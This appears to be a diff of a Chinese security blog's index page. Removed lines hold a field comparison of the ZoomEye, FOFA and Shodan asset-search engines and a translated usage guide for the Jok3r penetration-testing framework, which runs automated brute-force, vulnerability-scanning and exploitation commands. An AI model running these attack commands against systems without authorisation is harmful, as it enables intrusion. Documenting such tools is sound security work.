class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123; &quot;matches&quot;: [ &#123;</span><br><span class="line">    &quot;geoinfo&quot;: &#123;</span><br><span class="line">        &quot;asn&quot;: 45261,</span><br><span class="line">        &quot;city&quot;: &#123;</span><br><span class="line">            &quot;names&quot;: &#123;</span><br><span class="line">                &quot;en&quot;: &quot;Brisbane&quot;,</span><br><span class="line">                &quot;zh-CN&quot;: &quot;\u5e03\u91cc\u65af\u73ed&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;continent&quot;: &#123;</span><br><span class="line">            &quot;code&quot;: &quot;OC&quot;,</span><br><span class="line">            &quot;names&quot;: &#123;</span><br><span class="line">                &quot;en&quot;: &quot;Oceania&quot;,</span><br><span class="line">                &quot;zh-CN&quot;: &quot;\u5927\u6d0b\u6d32&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;country&quot;: &#123;</span><br><span class="line">            &quot;code&quot;: &quot;AU&quot;,</span><br><span class="line">            &quot;names&quot;: &#123;</span><br><span class="line">                &quot;en&quot;: &quot;Australia&quot;,</span><br><span class="line">                &quot;zh-CN&quot;: &quot;\u6fb3\u5927\u5229\u4e9a&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;location&quot;: &#123;</span><br><span class="line">            &quot;lat&quot;: -27.471,</span><br><span class="line">            &quot;lon&quot;: 153.0243</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;ip&quot;: &quot;192.168.1.1&quot;,</span><br><span class="line">    &quot;portinfo&quot;: &#123;</span><br><span class="line">        &quot;app&quot;: &quot;&quot;,</span><br><span class="line">        &quot;banner&quot;: &quot;+OK Hello there.\r\n-ERR Invalid command.\r\n\n&quot;,</span><br><span class="line">        &quot;device&quot;: &quot;&quot;,</span><br><span class="line">        &quot;extrainfo&quot;: &quot;&quot;,</span><br><span class="line">        &quot;hostname&quot;: &quot;&quot;,</span><br><span class="line">        &quot;os&quot;: &quot;&quot;,</span><br><span class="line">        &quot;port&quot;: 110,</span><br><span class="line">        &quot;service&quot;: &quot;&quot;,</span><br><span class="line">        &quot;version&quot;: &quot;&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;timestamp&quot;: &quot;2016-03-09T16:14:04&quot;</span><br><span class="line">    &#125;, ... ...],</span><br><span class="line">   &quot;facets&quot;: &#123;</span><br><span class="line">   &#125;,</span><br><span class="line">    &quot;total&quot;: 28731397</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>HOST 固定属性</strong><br><img src="http://qiniu.austfish.cn/yuque/FhQdetAJ56WRXYRs0z1Xx6keuWCg.png"></p>
-<p><strong>WEB 固定属性</strong><br><img src="http://qiniu.austfish.cn/yuque/FkbKR84sUT6TUlxy35klF6TV6-i0.png"><br><img src="http://qiniu.austfish.cn/yuque/FkKxuFDJvTEa-g9w01V68jvkM8WB.png"></p>
-<h5 id="4-代码调用-1"><a href="#4-代码调用-1" class="headerlink" title="4 代码调用"></a>4 代码调用</h5><p><img src="http://qiniu.austfish.cn/yuque/FnPV7VAa1p4Mt2CE8o96OB3vGWvR.png"></p>
-<h4 id="0×05-探测资产对比"><a href="#0×05-探测资产对比" class="headerlink" title="0×05 探测资产对比"></a>0×05 探测资产对比</h4><table>
-<thead>
-<tr>
-<th>字段</th>
-<th>说明</th>
-<th>zoomeye</th>
-<th>fofa</th>
-<th>shodan</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>ip</td>
-<td>IP 地址</td>
-<td>ip</td>
-<td>ip</td>
-<td>ip_str</td>
-</tr>
-<tr>
-<td>asn</td>
-<td>ASN 号</td>
-<td>geoinfo.asn</td>
-<td>as_number</td>
-<td>asn</td>
-</tr>
-<tr>
-<td>city</td>
-<td>城市</td>
-<td>geoinfo.city</td>
-<td>city</td>
-<td>location.city</td>
-</tr>
-<tr>
-<td>province</td>
-<td>省</td>
-<td></td>
-<td>province</td>
-<td></td>
-</tr>
-<tr>
-<td>country_code</td>
-<td>国家码</td>
-<td>geoinfo.country.code</td>
-<td>country</td>
-<td>location.country_code</td>
-</tr>
-<tr>
-<td>country</td>
-<td>国家名</td>
-<td>geoinfo.country.name</td>
-<td>country_name</td>
-<td>location.country_name</td>
-</tr>
-<tr>
-<td>continent_code</td>
-<td>洲际码</td>
-<td>geoinfo.continent.code</td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td>continent_name</td>
-<td>洲际名</td>
-<td>geoinfo.continent.name</td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td>latitude</td>
-<td>纬度</td>
-<td>geoinfo.location.latitude</td>
-<td>latitude</td>
-<td>location.latitude</td>
-</tr>
-<tr>
-<td>longitude</td>
-<td>经度</td>
-<td>geoinfo.location.longitude</td>
-<td>longitude</td>
-<td>location.longitude</td>
-</tr>
-<tr>
-<td>port</td>
-<td>端口号</td>
-<td>port</td>
-<td>port</td>
-<td>port</td>
-</tr>
-<tr>
-<td>banner</td>
-<td>端口指纹信息</td>
-<td>banner</td>
-<td>banner</td>
-<td>data</td>
-</tr>
-<tr>
-<td>server</td>
-<td>产品名称</td>
-<td>portinfo.app</td>
-<td>server</td>
-<td>product</td>
-</tr>
-<tr>
-<td>hostname</td>
-<td>主机名</td>
-<td>portinfo.hostname</td>
-<td>host</td>
-<td>hostnames</td>
-</tr>
-<tr>
-<td>os</td>
-<td>操作系统名称</td>
-<td>portinfo.os</td>
-<td></td>
-<td>os</td>
-</tr>
-<tr>
-<td>version</td>
-<td>产品，应用版本信息</td>
-<td>portinfo.version</td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td>info</td>
-<td>额外信息</td>
-<td>portinfo.info</td>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td>device</td>
-<td>设备类型</td>
-<td>portinfo.device</td>
-<td></td>
-<td>tags</td>
-</tr>
-<tr>
-<td>title</td>
-<td>标题</td>
-<td></td>
-<td>title</td>
-<td></td>
-</tr>
-<tr>
-<td>domain</td>
-<td>域名</td>
-<td></td>
-<td>domain</td>
-<td>domains</td>
-</tr>
-<tr>
-<td>header</td>
-<td>http 头</td>
-<td></td>
-<td>header</td>
-<td></td>
-</tr>
-<tr>
-<td>protocol</td>
-<td>协议</td>
-<td></td>
-<td>protocol</td>
-<td>transport</td>
-</tr>
-<tr>
-<td>cert</td>
-<td>证书</td>
-<td></td>
-<td>cert</td>
-<td></td>
-</tr>
-<tr>
-<td>isp</td>
-<td>互联网供应商</td>
-<td></td>
-<td>isp</td>
-<td>isp</td>
-</tr>
-<tr>
-<td>lastupdatetime</td>
-<td>最后更新时间</td>
-<td></td>
-<td>lastupdatetime</td>
-<td>timestamp</td>
-</tr>
-<tr>
-<td>org</td>
-<td>组织</td>
-<td></td>
-<td>as_organization</td>
-<td>org</td>
-</tr>
-<tr>
-<td></td>
-<td>组织代码</td>
-<td></td>
-<td>as_number</td>
-<td></td>
-</tr>
-</tbody></table>
-
+        <p>网络探测指对计算机网络或 DNS 服务器进行扫描，获取有效的地址、活动端口号、主机操作系统类型和安全弱点的攻击方式。</p>
+        
+          <a class="article-more-a" href="/2021/04/08/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%8E%A2%E6%B5%8B%E5%B7%A5%E5%85%B7%E8%B0%83%E7%A0%94/#more">more >></a>
+        
       
 
       
@@ -1422,7 +918,33 @@ var _hmt = _hmt || [];
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">安全</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">探测</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/工具/" class="article-tag-list-link color3">工具</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
 
       
         <p class="article-more-link">
@@ -1476,210 +998,10 @@ var _hmt = _hmt || [];
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h4 id="0×00-前言"><a href="#0×00-前言" class="headerlink" title="0×00 前言"></a>0×00 前言</h4><p><strong>Jok3r 是一个 Python3 CLI 应用程序，旨在帮助渗透测试人员进行网络基础设施和 Web 黑盒安全性测试。</strong></p>
-<p>目标是通过自动执行尽可能多的安全测试来节省网络&#x2F;网络渗透测试期间的尽可能多的时间，以便快速识别悬而未决的漏洞，然后将更多的时间花在更有趣和棘手的事情上！</p>
-<p>基于这一观察，目前有许多针对通用网络服务的黑客入侵开源工具&#x2F;脚本（来自各种来源），可以执行从指纹识别到利用的各种任务。因此，Jok3r 的想法是以一种聪明的方式组合那些开源工具，以获得更相关的结果。</p>
-<h2 id="0×01-项目描述"><a href="#0×01-项目描述" class="headerlink" title="0×01 项目描述"></a>0×01 项目描述</h2><h4 id="Pentest-工具箱管理"><a href="#Pentest-工具箱管理" class="headerlink" title="Pentest 工具箱管理"></a>Pentest 工具箱管理</h4><ul>
-<li><strong>工具选择</strong>：汇编来自各种来源的 50 多种开源工具和脚本。</li>
-<li><strong>基于 Docker 的应用程序</strong>：打包在运行 Kali OS 的 Docker 映像中的应用程序，可在 Docker Hub 上找到。</li>
-<li><strong>即用型</strong>：安装了所有工具和依赖项，只需提取 Docker 映像并运行一个新容器即可。</li>
-<li><strong>更新变得容易</strong>：仅运行一个命令即可轻松使整个工具箱保持最新状态。</li>
-<li><strong>轻松自定义</strong>：轻松从简单的配置文件添加&#x2F;删除工具。</li>
-</ul>
-<h4 id="网络基础设施安全评估"><a href="#网络基础设施安全评估" class="headerlink" title="网络基础设施安全评估"></a>网络基础设施安全评估</h4><ul>
-<li><strong>许多受支持的服务</strong>：针对最常见的 TCP &#x2F; UDP 服务（HTTP，FTP，SSH，SMB，Oracle，MS-SQL，MySQL，PostgreSQL，VNC 等）。</li>
-<li><strong>结合工具的力量</strong>：每个安全检查均由工具箱中的工具执行。通过链接安全检查来执行攻击。</li>
-<li><strong>上下文意识</strong>：根据目标的上下文（即检测到的技术，凭据，漏洞等）来选择和调整要运行的安全检查。</li>
-<li><strong>侦查</strong>：对目标服务执行自动指纹识别（产品检测）。</li>
-<li><strong>CVE 查找</strong>：检测到产品名称及其版本后，将在联机 CVE 数据库上执行漏洞查找（使用 Vulners 和 CVE 详细信息）。</li>
-<li><strong>漏洞扫描</strong>：自动检查常见漏洞并尝试执行某些利用（自动拥有）。</li>
-<li><strong>蛮力攻击</strong>：自动检查服务上的默认&#x2F;通用凭据，并在必要时执行字典攻击。词表根据目标服务进行了优化。</li>
-<li><strong>身份验证后测试</strong>：找到有效凭据后，会自动执行一些漏洞利用后检查。</li>
-</ul>
-<h4 id="网络安全评估网络安全评估"><a href="#网络安全评估网络安全评估" class="headerlink" title="网络安全评估网络安全评估"></a>网络安全评估网络安全评估</h4><ul>
-<li><strong>重点关注 HTTP</strong>：目前支持针对 HTTP 的 60 多种不同的安全检查。</li>
-<li><strong>Web 技术检测</strong>：在安全检查之前运行基于 Wappalyzer 的指纹引擎，从而可以检测：编程语言，框架，JS 库，CMS，Web 和应用程序服务器。</li>
-<li><strong>服务器利用</strong>：自动扫描和&#x2F;或利用 Web 和应用程序服务器（例如 JBoss，Tomcat，Weblogic，Websphere，Jenkins 等）上的最关键漏洞（例如 RCE）。</li>
-<li><strong>CMS 漏洞扫描</strong>：在最常见的 CMS（Wordpress，Drupal，Joomla 等）上自动运行漏洞扫描程序。</li>
-</ul>
-<h4 id="本地数据库和报告"><a href="#本地数据库和报告" class="headerlink" title="本地数据库和报告"></a>本地数据库和报告</h4><ul>
-<li><strong>本地数据库</strong>：与目标相关的数据通过任务（工作区）组织到本地 Sqlite 数据库中，该数据库在安全测试期间保持更新。</li>
-<li><strong>类似于 Metasploit 的 Interactive Shell</strong>：通过带有几个内置命令的交互式 Shell 访问数据库。</li>
-<li><strong>从 Nmap 导入目标</strong>：手动或通过加载 Nmap 结果将目标添加到任务中。</li>
-<li><strong>从 Shodan 导入目标</strong>：从 shodan 手动将目标添加到任务中（需要 shodan API 密钥）。</li>
-<li><strong>访问所有结果</strong>：来自安全检查，检测到的凭据和漏洞的所有输出都存储在数据库中，并且可以轻松访问。</li>
-<li><strong>报告</strong>：生成完整的 HTML 报告，其中包含目标摘要，Web 屏幕截图以及来自安全测试的所有结果。</li>
-</ul>
-<h2 id="0×02-项目安装"><a href="#0×02-项目安装" class="headerlink" title="0×02 项目安装"></a>0×02 项目安装</h2><p>推荐的使用 Jok3r 的方法是拉 Docker 映像，因此您不必担心依赖关系问题并安装工具箱的各种黑客工具。一切都通过 Docker Hub 上可用的 Docker 容器进行了测试！</p>
-<ol>
-<li><strong>拉 Jok3r Docker 映像</strong>：</li>
-</ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker pull koutto/jok3r</span><br></pre></td></tr></table></figure>
-
-<ol start="2">
-<li><strong>运行新的 Docker 容器</strong>：</li>
-</ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run -i -t --name jok3r-container -w /root/jok3r -e DISPLAY=$DISPLAY -v /tmp/.X11-unix:/tmp/.X11-unix --shm-size 2g --net=host koutto/jok3r</span><br></pre></td></tr></table></figure>
-
-<ol start="3">
-<li><strong>要重新运行已停止的容器</strong>：</li>
-</ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker start -i jok3r-container</span><br></pre></td></tr></table></figure>
-
-<ol start="4">
-<li><strong>要在容器内打开多个外壳</strong>：</li>
-</ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker <span class="built_in">exec</span> -it jok3r-container bash</span><br></pre></td></tr></table></figure>
-
-<h2 id="0×03-项目更新"><a href="#0×03-项目更新" class="headerlink" title="0×03 项目更新"></a>0×03 项目更新</h2><p><strong>为了进行更新，只需从 Docker Hub 中提取最新的 Docker 映像，然后从该新映像运行一个新的容器：</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo docker pull koutto/jok3r</span><br><span class="line"></span><br><span class="line">sudo docker run -i -t --name jok3r-container-updated -w /root/jok3r -e DISPLAY=$DISPLAY -v /tmp/.X11-unix:/tmp/.X11-unix --shm-size 2g --net=host koutto/jok3r</span><br></pre></td></tr></table></figure>
-
-<h2 id="0×04-快速使用"><a href="#0×04-快速使用" class="headerlink" title="0×04 快速使用"></a>0×04 快速使用</h2><h4 id="Pentest-工具箱管理-1"><a href="#Pentest-工具箱管理-1" class="headerlink" title="Pentest 工具箱管理"></a>Pentest 工具箱管理</h4><ul>
-<li>显示工具箱中的所有工具：</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 jok3r.py toolbox --show-<span class="built_in">all</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>在工具箱中安装所有工具（已在 Docker 容器中完成）：</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 jok3r.py toolbox --install-<span class="built_in">all</span> --auto</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>更新工具箱中的所有工具，并每次提示检查更新：</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 jok3r.py toolbox --update-<span class="built_in">all</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>在没有任何提示的情况下更新工具箱中的所有工具：</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 jok3r.py toolbox --update-<span class="built_in">all</span> --auto</span><br></pre></td></tr></table></figure>
-
-<h4 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h4><ul>
-<li>列出支持的服务：</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 jok3r.py info --services</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>显示给定服务的安全检查：</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 jok3r.py info --checks &lt;service&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>显示给定服务支持的攻击配置文件：</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 jok3r.py info --attack-profiles &lt;service&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>显示所有服务支持的产品：</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 jok3r.py info --products</span><br></pre></td></tr></table></figure>
-
-<h4 id="安全测试"><a href="#安全测试" class="headerlink" title="安全测试"></a>安全测试</h4><p>在本地数据库中创建一个新任务：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python3 jok3r.py db</span><br><span class="line"></span><br><span class="line">jok3rdb[default]&gt; mission -a mayhem</span><br><span class="line"></span><br><span class="line">[+] Mission <span class="string">&quot;mayhem&quot;</span> successfully added</span><br><span class="line">[*] Selected mission <span class="keyword">is</span> now mayhem</span><br><span class="line"></span><br><span class="line">jok3rdb[mayhem]&gt;</span><br></pre></td></tr></table></figure>
-
-<h6 id="单一目标："><a href="#单一目标：" class="headerlink" title="单一目标："></a>单一目标：</h6><ul>
-<li>以交互方式对 URL 运行所有安全检查，并将结果添加到“ mayhem”任务中：</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 jok3r.py attack -t https://www.example.com/ --add2db mayhem</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>针对 MS-SQL 服务运行安全检查（无用户交互），并将结果添加到任务中：</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 jok3r.py attack -t <span class="number">192.168</span><span class="number">.1</span><span class="number">.42</span>:<span class="number">1433</span> -s mssql --add2db mayhem --fast</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>针对 FTP 服务仅运行“ recon”和“ vulnscan”安全检查，并将结果添加到任务中：</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 jok3r.py attack -t <span class="number">192.168</span><span class="number">.1</span><span class="number">.142</span>:<span class="number">21</span> -s ftp --cat-only recon,vulnscan --add2db mayhem</span><br></pre></td></tr></table></figure>
-
-<h6 id="多个目标："><a href="#多个目标：" class="headerlink" title="多个目标："></a>多个目标：</h6><ul>
-<li>在任务“ mayhem”中注册的所有服务上仅搜索“轻松获胜”（严重漏洞和易于利用）：</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 jok3r.py attack -m mayhem --profile red-team --fast</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>针对给定任务中的所有服务运行所有安全检查，并将结果存储在数据库中：</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 jok3r.py attack -m mayhem --fast</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>从任务中仅对在端口 21 &#x2F; tcp 和 2121 &#x2F; tcp 上运行的 FTP 服务运行安全性检查：</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 jok3r.py attack -m mayhem -f <span class="string">&quot;port=21,2121;service=ftp&quot;</span> --fast</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>对该任务仅对在端口 2121 &#x2F; tcp 上运行的 FTP 服务和在 192.168.1.42 上的所有 HTTP 服务运行安全检查：</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 jok3r.py attack -m mayhem -f <span class="string">&quot;port=2121;service=ftp&quot;</span> -f <span class="string">&quot;ip=192.168.1.42;service=http&quot;</span></span><br></pre></td></tr></table></figure>
-
-<h6 id="数据库访问和报告"><a href="#数据库访问和报告" class="headerlink" title="数据库访问和报告"></a>数据库访问和报告</h6><ul>
-<li>选择一个任务：</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 jok3r.py db</span><br><span class="line">jok3rdb[default]&gt; mission mayhem</span><br><span class="line">[*] Selected mission <span class="keyword">is</span> now mayhem</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>将主机&#x2F;服务从 Nmap 结果（XML）导入任务范围：</li>
-<li>从 Shodan 结果（ip）导入主机&#x2F;服务到任务范围：</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jok3rdb[mayhem]&gt; nmap results.xml</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>显示在选定任务中注册的服务，主机，检测到的产品和凭据：</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jok3rdb[mayhem]&gt; services</span><br><span class="line">jok3rdb[mayhem]&gt; hosts</span><br><span class="line">jok3rdb[mayhem]&gt; products</span><br><span class="line">jok3rdb[mayhem]&gt; creds</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>在检查结果中搜索字符串以选择任务：</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jok3rdb[mayhem]&gt; results --search <span class="string">&#x27;&lt;search_string&gt;&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>从选定任务中的检查输出中自动检测到的显示漏洞（实验性）：</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jok3rdb[mayhem]&gt; vulns</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>为所选任务生成 HTML 报告：</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jok3rdb[mayhem]&gt; report</span><br></pre></td></tr></table></figure>
-
-<h2 id="0×05-典型用法示例"><a href="#0×05-典型用法示例" class="headerlink" title="0×05 典型用法示例"></a>0×05 典型用法示例</h2><h4 id="操作流程"><a href="#操作流程" class="headerlink" title="操作流程"></a>操作流程</h4><p><strong>您将在范围内的几台服务器上开始渗透测试。这是 JoK3r 用法的典型示例：</strong></p>
-<ol>
-<li>您在范围内的服务器上运行 Nmap 扫描。</li>
-<li>您在本地数据库中创建一个新任务（假设为“ mayhem”）：</li>
-</ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3 jok3r.py db</span><br><span class="line">jok3rdb[default]&gt; mission -a mayhem</span><br><span class="line">[+] Mission <span class="string">&quot;mayhem&quot;</span> successfully added</span><br><span class="line">[*] Selected mission <span class="keyword">is</span> now mayhem</span><br><span class="line">jok3rdb[mayhem]&gt;</span><br></pre></td></tr></table></figure>
-
-<ol start="3">
-<li>您从数据库中的 Nmap 扫描导入结果：</li>
-</ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jok3rdb [mayhem]&gt; nmap results.xml</span><br></pre></td></tr></table></figure>
-
-<ol start="4">
-<li>然后，您可以快速了解范围内的所有服务和主机，添加一些注释，如果已经对目标有所了解（灰色框渗透测试），则可以添加一些凭据，等等。</li>
-</ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jok3rdb[mayhem]&gt; hosts</span><br><span class="line">[...]</span><br><span class="line">jok3rdb[mayhem]&gt; services</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
-
-<ol start="5">
-<li>现在，您可以对合并范围中的某些目标运行安全检查。例如，如果要对作用域中的所有 Java-RMI 服务运行检查，则可以运行以下命令：</li>
-</ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 jok3r.py attack -m mayhem -f <span class="string">&quot;service=java-rmi&quot;</span> --fast</span><br></pre></td></tr></table></figure>
-
-<ol start="6">
-<li>您可以在执行工具时实时查看安全检查的全部结果，也可以稍后使用以下命令从数据库查看安全检查的全部结果</li>
-</ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jok3rdb[mayhem]&gt; results</span><br></pre></td></tr></table></figure>
-
-<ol start="7">
-<li>在任何时候，都可以显示从安全检查输出中自动提取的数据，即检测到的产品，凭据和漏洞。</li>
-</ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">jok3rdb[mayhem]&gt; products</span><br><span class="line">[...]</span><br><span class="line">jok3rdb[mayhem]&gt; creds</span><br><span class="line">[...]</span><br><span class="line">jok3rdb[mayhem]&gt; vulns</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
-
-<ol start="8">
-<li>您随时可以生成 HTML 报告，其中包含任务范围内所有目标的摘要，HTTP 服务的网页屏幕截图以及已运行的所有安全检查的完整输出：</li>
-</ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jok3rdb[mayhem]&gt; report</span><br></pre></td></tr></table></figure>
-
+        <p>Jok3r 是一个 Python3 CLI 应用程序，旨在帮助渗透测试人员进行网络基础设施和 Web 黑盒安全性测试。</p>
+        
+          <a class="article-more-a" href="/2021/04/08/JOK3R/#more">more >></a>
+        
       
 
       
@@ -1687,510 +1009,37 @@ var _hmt = _hmt || [];
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">安全</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞扫描</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/工具/" class="article-tag-list-link color3">工具</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
 
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2021/04/08/JOK3R/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-漏洞攻防系列-SQL注入" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/04/08/%E6%BC%8F%E6%B4%9E%E6%94%BB%E9%98%B2%E7%B3%BB%E5%88%97-SQL%E6%B3%A8%E5%85%A5/">漏洞攻防系列-SQL注入</a>
-    </h1>
-  
-
-        
-        <a href="/2021/04/08/%E6%BC%8F%E6%B4%9E%E6%94%BB%E9%98%B2%E7%B3%BB%E5%88%97-SQL%E6%B3%A8%E5%85%A5/" class="archive-article-date">
